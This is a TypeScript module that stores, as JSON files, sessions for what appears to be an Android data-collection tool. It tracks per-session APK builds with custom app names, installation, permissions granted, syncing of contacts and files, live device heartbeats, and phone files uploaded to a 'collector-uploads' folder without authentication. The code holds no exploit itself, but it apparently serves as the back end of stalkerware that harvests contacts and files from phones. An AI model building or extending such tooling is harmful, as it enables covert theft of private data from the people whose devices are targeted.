import fs from "fs";
import path from "path";
import { randomUUID } from "crypto";

// ─── File-Based JSON Database ────────────────────────────
// Uses the /db folder as the database, storing each session as a JSON file.
// No Prisma, no SQLite, no auth needed.

const DB_DIR = process.env.DB_DIR || path.join(process.cwd(), "db");
const SESSIONS_DIR = path.join(DB_DIR, "sessions");
const FILES_DIR = path.join(DB_DIR, "files");

// Ensure directories exist
function ensureDirs() {
  if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
  if (!fs.existsSync(FILES_DIR)) fs.mkdirSync(FILES_DIR, { recursive: true });
}

ensureDirs();

// ─── Types ──────────────────────────────────────────────

export type SessionStatus =
  | 'apk_built'
  | 'waiting_install'
  | 'app_installed'
  | 'permissions_granted'
  | 'syncing_contacts'
  | 'syncing_files'
  | 'live_connected'
  | 'offline';

export interface StatusEntry {
  status: SessionStatus;
  timestamp: string;
  detail?: string;
}

export interface DeviceInfo {
  id: string;
  name: string;
  model: string;
  brand: string;
  androidVersion: string;
  lastHeartbeat?: string;
  firstSeen: string;
}

export interface ContactSession {
  id: string;
  contacts: string; // JSON array of contacts
  files: string; // JSON array of file metadata
  appName: string;
  count: number;
  fileCount: number;
  createdAt: string;
  status?: SessionStatus;
  statusHistory?: StatusEntry[];
  lastHeartbeat?: string;
  buildId?: string;
  devices?: Record<string, DeviceInfo>; // deviceId -> DeviceInfo
}

export interface UploadedFile {
  id: string;
  sessionId: string;
  deviceId?: string; // Which device uploaded this file
  filePath: string; // Original path on phone
  fileName: string;
  fileSize: number;
  fileType: string;
  serverPath: string; // Relative path on server filesystem
  uploadedAt: string;
}

// ─── Session Operations ─────────────────────────────────

export async function createSession(data: {
  contacts: string;
  files: string;
  appName: string;
  count: number;
  fileCount: number;
  buildId?: string;
}): Promise<ContactSession> {
  ensureDirs();
  const id = randomUUID();
  const session: ContactSession = {
    id,
    contacts: data.contacts,
    files: data.files,
    appName: data.appName,
    count: data.count,
    fileCount: data.fileCount,
    createdAt: new Date().toISOString(),
    buildId: data.buildId,
    devices: {},
  };
  fs.writeFileSync(
    path.join(SESSIONS_DIR, `${id}.json`),
    JSON.stringify(session, null, 2)
  );
  return session;
}

export async function findSessionById(
  id: string
): Promise<ContactSession | null> {
  ensureDirs();
  const filePath = path.join(SESSIONS_DIR, `${id}.json`);
  if (!fs.existsSync(filePath)) return null;
  try {
    const raw = fs.readFileSync(filePath, "utf-8");
    return JSON.parse(raw) as ContactSession;
  } catch {
    return null;
  }
}

export async function deleteSessionById(id: string): Promise<boolean> {
  ensureDirs();
  const filePath = path.join(SESSIONS_DIR, `${id}.json`);
  if (!fs.existsSync(filePath)) return false;
  try {
    fs.unlinkSync(filePath);
    // Also delete associated file records
    const files = await findFilesBySessionId(id);
    for (const f of files) {
      const fp = path.join(FILES_DIR, `${f.id}.json`);
      if (fs.existsSync(fp)) fs.unlinkSync(fp);
    }
    // Delete uploaded physical files
    const UPLOAD_DIR = process.env.UPLOAD_DIR || "/tmp/collector-uploads";
    const sessionDir = path.join(UPLOAD_DIR, id);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    return true;
  } catch {
    return false;
  }
}

// ─── Session Status Operations ────────────────────────────

export async function updateSessionStatus(
  id: string,
  status: SessionStatus,
  detail?: string
): Promise<ContactSession | null> {
  ensureDirs();
  const filePath = path.join(SESSIONS_DIR, `${id}.json`);
  if (!fs.existsSync(filePath)) return null;
  try {
    const raw = fs.readFileSync(filePath, "utf-8");
    const session = JSON.parse(raw) as ContactSession;
    session.status = status;
    if (!session.statusHistory) session.statusHistory = [];
    session.statusHistory.push({
      status,
      timestamp: new Date().toISOString(),
      detail,
    });
    fs.writeFileSync(filePath, JSON.stringify(session, null, 2));
    return session;
  } catch {
    return null;
  }
}

export async function updateSessionHeartbeat(
  id: string,
  deviceId?: string
): Promise<ContactSession | null> {
  ensureDirs();
  const filePath = path.join(SESSIONS_DIR, `${id}.json`);
  if (!fs.existsSync(filePath)) return null;
  try {
    const raw = fs.readFileSync(filePath, "utf-8");
    const session = JSON.parse(raw) as ContactSession;
    const now = new Date().toISOString();
    session.lastHeartbeat = now;

    // If status was offline or in a syncing state, change to live_connected
    if (
      session.status === 'offline' ||
      session.status === 'syncing_contacts' ||
      session.status === 'syncing_files' ||
      session.status === 'permissions_granted' ||
      session.status === 'app_installed' ||
      session.status === 'waiting_install'
    ) {
      session.status = 'live_connected';
      if (!session.statusHistory) session.statusHistory = [];
      session.statusHistory.push({
        status: 'live_connected',
        timestamp: now,
        detail: 'Heartbeat recovered connection',
      });
    }

    // Update device heartbeat if deviceId provided
    if (deviceId && session.devices && session.devices[deviceId]) {
      session.devices[deviceId].lastHeartbeat = now;
    }

    fs.writeFileSync(filePath, JSON.stringify(session, null, 2));
    return session;
  } catch {
    return null;
  }
}

export async function getAllSessions(): Promise<ContactSession[]> {
  ensureDirs();
  const sessions: ContactSession[] = [];
  try {
    const entries = fs.readdirSync(SESSIONS_DIR);
    for (const entry of entries) {
      if (!entry.endsWith(".json")) continue;
      try {
        const raw = fs.readFileSync(path.join(SESSIONS_DIR, entry), "utf-8");
        const parsed = JSON.parse(raw) as ContactSession;
        sessions.push(parsed);
      } catch {
        // Skip corrupt files
      }
    }
  } catch {
    // Directory may not exist yet
  }
  // Sort by createdAt descending
  sessions.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
  return sessions;
}

export async function updateSession(
  id: string,
  updates: Partial<ContactSession>
): Promise<ContactSession | null> {
  ensureDirs();
  const filePath = path.join(SESSIONS_DIR, `${id}.json`);
  if (!fs.existsSync(filePath)) return null;
  try {
    const raw = fs.readFileSync(filePath, "utf-8");
    const session = JSON.parse(raw) as ContactSession;
    Object.assign(session, updates);
    fs.writeFileSync(filePath, JSON.stringify(session, null, 2));
    return session;
  } catch {
    return null;
  }
}

// ─── Device Operations ────────────────────────────────────

export async function registerOrUpdateDevice(
  sessionId: string,
  deviceInfo: {
    id: string;
    name: string;
    model: string;
    brand: string;
    androidVersion: string;
  }
): Promise<ContactSession | null> {
  ensureDirs();
  const filePath = path.join(SESSIONS_DIR, `${sessionId}.json`);
  if (!fs.existsSync(filePath)) return null;
  try {
    const raw = fs.readFileSync(filePath, "utf-8");
    const session = JSON.parse(raw) as ContactSession;
    if (!session.devices) session.devices = {};

    const now = new Date().toISOString();
    if (session.devices[deviceInfo.id]) {
      // Update existing device info
      session.devices[deviceInfo.id].name = deviceInfo.name;
      session.devices[deviceInfo.id].model = deviceInfo.model;
      session.devices[deviceInfo.id].brand = deviceInfo.brand;
      session.devices[deviceInfo.id].androidVersion = deviceInfo.androidVersion;
      session.devices[deviceInfo.id].lastHeartbeat = now;
    } else {
      // Register new device
      session.devices[deviceInfo.id] = {
        id: deviceInfo.id,
        name: deviceInfo.name,
        model: deviceInfo.model,
        brand: deviceInfo.brand,
        androidVersion: deviceInfo.androidVersion,
        lastHeartbeat: now,
        firstSeen: now,
      };
    }

    fs.writeFileSync(filePath, JSON.stringify(session, null, 2));
    return session;
  } catch {
    return null;
  }
}

// ─── Uploaded File Operations ───────────────────────────

export async function createUploadedFile(data: {
  sessionId: string;
  deviceId?: string;
  filePath: string;
  fileName: string;
  fileSize: number;
  fileType: string;
  serverPath: string;
}): Promise<UploadedFile> {
  ensureDirs();
  const id = randomUUID();
  const uploadedFile: UploadedFile = {
    id,
    sessionId: data.sessionId,
    deviceId: data.deviceId || '',
    filePath: data.filePath,
    fileName: data.fileName,
    fileSize: data.fileSize,
    fileType: data.fileType,
    serverPath: data.serverPath,
    uploadedAt: new Date().toISOString(),
  };
  fs.writeFileSync(
    path.join(FILES_DIR, `${id}.json`),
    JSON.stringify(uploadedFile, null, 2)
  );
  return uploadedFile;
}

export async function findFileById(
  id: string
): Promise<UploadedFile | null> {
  ensureDirs();
  const filePath = path.join(FILES_DIR, `${id}.json`);
  if (!fs.existsSync(filePath)) return null;
  try {
    const raw = fs.readFileSync(filePath, "utf-8");
    return JSON.parse(raw) as UploadedFile;
  } catch {
    return null;
  }
}

export async function findFilesBySessionId(
  sessionId: string
): Promise<UploadedFile[]> {
  ensureDirs();
  const files: UploadedFile[] = [];
  try {
    const entries = fs.readdirSync(FILES_DIR);
    for (const entry of entries) {
      if (!entry.endsWith(".json")) continue;
      try {
        const raw = fs.readFileSync(path.join(FILES_DIR, entry), "utf-8");
        const parsed = JSON.parse(raw) as UploadedFile;
        if (parsed.sessionId === sessionId) {
          files.push(parsed);
        }
      } catch {
        // Skip corrupt files
      }
    }
  } catch {
    // Directory may not exist yet
  }
  return files;
}

export async function deleteFileById(fileId: string): Promise<boolean> {
  ensureDirs();
  const UPLOAD_DIR = process.env.UPLOAD_DIR || "/tmp/collector-uploads";
  const filePath = path.join(FILES_DIR, `${fileId}.json`);
  if (!fs.existsSync(filePath)) return false;
  try {
    const raw = fs.readFileSync(filePath, "utf-8");
    const fileData = JSON.parse(raw) as UploadedFile;

    // Delete physical file using correct UPLOAD_DIR
    if (fileData.serverPath) {
      const fullPath = path.join(UPLOAD_DIR, fileData.serverPath);
      if (fs.existsSync(fullPath)) {
        fs.unlinkSync(fullPath);
      }
    }

    // Delete metadata JSON
    fs.unlinkSync(filePath);
    return true;
  } catch {
    return false;
  }
}
